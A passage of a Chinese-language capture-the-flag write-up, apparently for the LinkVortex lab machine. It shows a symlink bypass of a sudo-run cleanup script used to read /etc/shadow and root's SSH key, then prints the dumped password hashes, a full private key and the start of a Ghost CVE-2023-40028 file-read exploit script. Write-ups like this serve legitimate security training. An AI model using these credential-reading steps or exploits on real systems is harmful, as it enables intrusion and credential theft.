+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">LINK</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#E36209;--shiki-light-font-style:inherit;--shiki-dark:#4BF3C8;--shiki-dark-font-style:italic">$1</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic"># 检查参数必须为 *.png</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">if</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> !</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> [[ </span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$LINK</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =~</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \.</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">png$ ]]; </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">then</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">  /usr/bin/echo</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "! First argument must be a png file !"</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">  exit</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> 2</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">fi</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic"># 如果连接文件存在</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">if</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> /usr/bin/sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> /usr/bin/test</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -L</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $LINK</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">then</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic">  # 获取文件链接名</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">  LINK_NAME</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">$(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">/usr/bin/basename</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $LINK</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">、</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic">  # 获取链接文件路径</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">  LINK_TARGET</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">$(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">/usr/bin/readlink</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $LINK</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">  </span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic">  # 如果链接的文件路径包含 etc 或 root 则取消链接</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">  if</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> /usr/bin/echo</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$LINK_TARGET</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> /usr/bin/grep</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -Eq</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> '(etc|root)'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">then</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">    /usr/bin/echo</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "! Trying to read critical files, removing link [ </span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$LINK</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> ] !"</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">    /usr/bin/unlink</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $LINK</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">    </span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">  else</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic">    # 否则输出发现链接，并将链接复制到 /var/quarantined 目录中</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">    /usr/bin/echo</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "Link found [ </span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$LINK</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> ] , moving it to quarantine"</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">    /usr/bin/mv</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $LINK</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $QUAR_DIR</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">/</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic">    # 如果变量 CHECK_CONTENT 为 true，则打印链接的文件内容</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">    if</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $CHECK_CONTENT</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">then</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">      /usr/bin/echo</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "Content:"</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">      /usr/bin/cat</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $QUAR_DIR</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">/</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$LINK_NAME</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> 2&gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">/dev/null</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">    fi</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">  fi</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">fi</span></span></code></pre>
+<p>那么思路很清晰了，就是链接敏感文件，然后让他打印出内容，这里的小限制就是路径，可以通过二次链接来绕过。</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span># 链接敏感文件</span></span>
+<span class="line"><span>ln -s /etc/shadow 1.png</span></span>
+<span class="line"><span># 二次链接消除链接的文件路径</span></span>
+<span class="line"><span>ln -s 1.png 2.png</span></span>
+<span class="line"><span># 设置变量 CHECK_CONTENT</span></span>
+<span class="line"><span>export CHECK_CONTENT=true</span></span>
+<span class="line"><span># 运行脚本，参数为 2.png</span></span>
+<span class="line"><span>sudo /usr/bin/bash /opt/ghost/clean_symlink.sh 2.png</span></span></code></pre>
+<p><img alt="image-20241208195217218.png" loading="lazy" decoding="async" width="1162" height="247" src="/_astro/image-20241208195217218.CPeMNM15_1LThl3.webp" srcset=""></p>
+<p>读取失败，尝试 <code>3.png -&gt; /home/bob/1.png</code></p>
+<p><img alt="image-20241208195323347.png" loading="lazy" decoding="async" width="2307" height="1068" src="/_astro/image-20241208195323347.Bbi-Q9Q8_1T1Ws3.webp" srcset=""></p>
+<p>读取成功，同样可以读取一下 root 的 id_rsa</p>
+<p><img alt="image-20241208195439847.png" loading="lazy" decoding="async" width="1288" height="630" src="/_astro/image-20241208195439847.DFuN_3wo_15dXJy.webp" srcset=""></p>
+<p>登录 root</p>
+<p><img alt="image-20241208195514468.png" loading="lazy" decoding="async" width="1893" height="657" src="/_astro/image-20241208195514468.Bxmy94w3_Z1pnNwc.webp" srcset=""></p>
+<h2 id="more-and-more">More and More</h2>
+<h3 id="dump-hash">Dump Hash</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>root:$y$j9T$C3zg87gHwrCXO0vl4igIh/$iisf9sVwilKAi7mI5p1FqQslJWM9t2.YUWznIPC/XIA:19814:0:99999:7:::</span></span>
+<span class="line"><span>daemon:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>bin:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>sys:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>sync:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>games:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>man:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>lp:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>mail:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>news:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>uucp:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>proxy:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>www-data:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>backup:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>list:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>irc:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>gnats:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>nobody:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>_apt:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>systemd-network:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>systemd-resolve:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>messagebus:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>systemd-timesync:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>pollinate:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>sshd:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>usbmux:*:19814:0:99999:7:::</span></span>
+<span class="line"><span>bob:$6$rounds=656000$4p3mw8hAd9ir.25f$ocGm9nW1TM2AB8Z.l0K.hi43bOrm3oxQsaKFACMoS2UL.tIXxSW3u/xsClrvkEhP5s.GUpdIvCX3qRtppDV8r.:19814:0:99999:7:::</span></span>
+<span class="line"><span>dnsmasq:*:19814:0:99999:7:::</span></span>
+<span class="line"><span>_laurel:!:20057::::::</span></span></code></pre>
+<h3 id="creds">Creds</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>-----BEGIN OPENSSH PRIVATE KEY-----</span></span>
+<span class="line"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span></span>
+<span class="line"><span>NhAAAAAwEAAQAAAYEAmpHVhV11MW7eGt9WeJ23rVuqlWnMpF+FclWYwp4SACcAilZdOF8T</span></span>
+<span class="line"><span>q2egYfeMmgI9IoM0DdyDKS4vG+lIoWoJEfZf+cVwaZIzTZwKm7ECbF2Oy+u2SD+X7lG9A6</span></span>
+<span class="line"><span>V1xkmWhQWEvCiI22UjIoFkI0oOfDrm6ZQTyZF99AqBVcwGCjEA67eEKt/5oejN5YgL7Ipu</span></span>
+<span class="line"><span>6sKpMThUctYpWnzAc4yBN/mavhY7v5+TEV0FzPYZJ2spoeB3OGBcVNzSL41ctOiqGVZ7yX</span></span>
+<span class="line"><span>TQ6pQUZxR4zqueIZ7yHVsw5j0eeqlF8OvHT81wbS5ozJBgtjxySWrRkkKAcY11tkTln6NK</span></span>
+<span class="line"><span>CssRzP1r9kbmgHswClErHLL/CaBb/04g65A0xESAt5H1wuSXgmipZT8Mq54lZ4ZNMgPi53</span></span>
+<span class="line"><span>jzZbaHGHACGxLgrBK5u4mF3vLfSG206ilAgU1sUETdkVz8wYuQb2S4Ct0AT14obmje7oqS</span></span>
+<span class="line"><span>0cBqVEY8/m6olYaf/U8dwE/w9beosH6T7arEUwnhAAAFiDyG/Tk8hv05AAAAB3NzaC1yc2</span></span>
+<span class="line"><span>EAAAGBAJqR1YVddTFu3hrfVnidt61bqpVpzKRfhXJVmMKeEgAnAIpWXThfE6tnoGH3jJoC</span></span>
+<span class="line"><span>PSKDNA3cgykuLxvpSKFqCRH2X/nFcGmSM02cCpuxAmxdjsvrtkg/l+5RvQOldcZJloUFhL</span></span>
+<span class="line"><span>woiNtlIyKBZCNKDnw65umUE8mRffQKgVXMBgoxAOu3hCrf+aHozeWIC+yKburCqTE4VHLW</span></span>
+<span class="line"><span>KVp8wHOMgTf5mr4WO7+fkxFdBcz2GSdrKaHgdzhgXFTc0i+NXLToqhlWe8l00OqUFGcUeM</span></span>
+<span class="line"><span>6rniGe8h1bMOY9HnqpRfDrx0/NcG0uaMyQYLY8cklq0ZJCgHGNdbZE5Z+jSgrLEcz9a/ZG</span></span>
+<span class="line"><span>5oB7MApRKxyy/wmgW/9OIOuQNMREgLeR9cLkl4JoqWU/DKueJWeGTTID4ud482W2hxhwAh</span></span>
+<span class="line"><span>sS4KwSubuJhd7y30httOopQIFNbFBE3ZFc/MGLkG9kuArdAE9eKG5o3u6KktHAalRGPP5u</span></span>
+<span class="line"><span>qJWGn/1PHcBP8PW3qLB+k+2qxFMJ4QAAAAMBAAEAAAGABtJHSkyy0pTqO+Td19JcDAxG1b</span></span>
+<span class="line"><span>O22o01ojNZW8Nml3ehLDm+APIfN9oJp7EpVRWitY51QmRYLH3TieeMc0Uu88o795WpTZts</span></span>
+<span class="line"><span>ZLEtfav856PkXKcBIySdU6DrVskbTr4qJKI29qfSTF5lA82SigUnaP+fd7D3g5aGaLn69b</span></span>
+<span class="line"><span>qcjKAXgo+Vh1/dkDHqPkY4An8kgHtJRLkP7wZ5CjuFscPCYyJCnD92cRE9iA9jJWW5+/Wc</span></span>
+<span class="line"><span>f36cvFHyWTNqmjsim4BGCeti9sUEY0Vh9M+wrWHvRhe7nlN5OYXysvJVRK4if0kwH1c6AB</span></span>
+<span class="line"><span>VRdoXs4Iz6xMzJwqSWze+NchBlkUigBZdfcQMkIOxzj4N+mWEHru5GKYRDwL/sSxQy0tJ4</span></span>
+<span class="line"><span>MXXgHw/58xyOE82E8n/SctmyVnHOdxAWldJeycATNJLnd0h3LnNM24vR4GvQVQ4b8EAJjj</span></span>
+<span class="line"><span>rF3BlPov1MoK2/X3qdlwiKxFKYB4tFtugqcuXz54bkKLtLAMf9CszzVBxQqDvqLU9NAAAA</span></span>
+<span class="line"><span>wG5DcRVnEPzKTCXAA6lNcQbIqBNyGlT0Wx0eaZ/i6oariiIm3630t2+dzohFCwh2eXS8nZ</span></span>
+<span class="line"><span>VACuS94oITmJfcOnzXnWXiO+cuokbyb2Wmp1VcYKaBJd6S7pM1YhvQGo1JVKWe7d4g88MF</span></span>
+<span class="line"><span>Mbf5tJRjIBdWS19frqYZDhoYUljq5ZhRaF5F/sa6cDmmMDwPMMxN7cfhRLbJ3xEIL7Kxm+</span></span>
+<span class="line"><span>TWYfUfzJ/WhkOGkXa3q46Fhn7Z1q/qMlC7nBlJM9Iz24HAxAAAAMEAw8yotRf9ZT7intLC</span></span>
+<span class="line"><span>+20m3kb27t8TQT5a/B7UW7UlcT61HdmGO7nKGJuydhobj7gbOvBJ6u6PlJyjxRt/bT601G</span></span>
+<span class="line"><span>QMYCJ4zSjvxSyFaG1a0KolKuxa/9+OKNSvulSyIY/N5//uxZcOrI5hV20IiH580MqL+oU6</span></span>
+<span class="line"><span>lM0jKFMrPoCN830kW4XimLNuRP2nar+BXKuTq9MlfwnmSe/grD9V3Qmg3qh7rieWj9uIad</span></span>
+<span class="line"><span>1G+1d3wPKKT0ztZTPauIZyWzWpOwKVAAAAwQDKF/xbVD+t+vVEUOQiAphz6g1dnArKqf5M</span></span>
+<span class="line"><span>SPhA2PhxB3iAqyHedSHQxp6MAlO8hbLpRHbUFyu+9qlPVrj36DmLHr2H9yHa7PZ34yRfoy</span></span>
+<span class="line"><span>+UylRlepPz7Rw+vhGeQKuQJfkFwR/yaS7Cgy2UyM025EEtEeU3z5irLA2xlocPFijw4gUc</span></span>
+<span class="line"><span>xmo6eXMvU90HVbakUoRspYWISr51uVEvIDuNcZUJlseINXimZkrkD40QTMrYJc9slj9wkA</span></span>
+<span class="line"><span>ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==</span></span>
+<span class="line"><span>-----END OPENSSH PRIVATE KEY-----</span></span></code></pre>
+<h3 id="exploit">Exploit</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic">#!/bin/bash</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic"># Exploit Title: Ghost Arbitrary File Read</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic"># Date: 10-03-2024</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic"># Exploit Author: Mohammad Yassine</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic"># Vendor Homepage: https://ghost.org/</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic"># Version: BEFORE [ 5.59.1 ]</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic"># Tested on: [ debian 11 bullseye ghost docker image ]</span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic"># CVE : CVE-2023-40028</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic">#THIS EXPLOIT WAS TESTED AGAINST A SELF HOSTED GHOST IMAGE USING DOCKER</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic">#GHOST ENDPOINT</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">GHOST_URL</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'http://linkvortex.htb'</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">GHOST_API</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$GHOST_URL</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">/ghost/api/v3/admin/"</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">API_VERSION</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'v3.0'</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">PAYLOAD_PATH</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"`</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">dirname</span><span style="--shiki-light:#005CC5;--shiki-light-font-style:inherit;--shiki-dark:#4BF3C8;--shiki-dark-font-style:italic"> $0</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">`/exploit"</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">PAYLOAD_ZIP_NAME</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">exploit.zip</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic"># Function to print usage</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> usage</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">() {</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">  echo</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "Usage: </span><span style="--shiki-light:#005CC5;--shiki-light-font-style:inherit;--shiki-dark:#4BF3C8;--shiki-dark-font-style:italic">$0</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> -u username -p password"</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">while</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> getopts</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> 'u:p:'</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> flag</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">; </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">do</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">  case</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "${</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">flag</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">}"</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> in</span></span>
+<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#EEF0F9">    u</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">)</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> USERNAME</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"${</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">OPTARG</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">}"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> ;;</span></span>
+<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#EEF0F9">    p</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">)</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> PASSWORD</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"${</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">OPTARG</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">}"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> ;;</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">    *)</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> usage</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">       exit</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> ;;</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">  esac</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">done</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">if</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> [[ </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">-z</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $USERNAME</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> ||</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> -z</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $PASSWORD</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> ]]; </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">then</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">  usage</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">  exit</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">fi</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> generate_exploit</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">()</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">{</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">  local</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> FILE_TO_READ</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#E36209;--shiki-light-font-style:inherit;--shiki-dark:#4BF3C8;--shiki-dark-font-style:italic">$1</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">  IMAGE_NAME</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">$(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">tr</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -dc</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> A-Za-z0-9</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> &lt;</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">/dev/urandom</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> head</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -c</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> 13</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">; </span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">echo</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">  mkdir</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -p</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $PAYLOAD_PATH</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">/content/images/2024/</span></span>
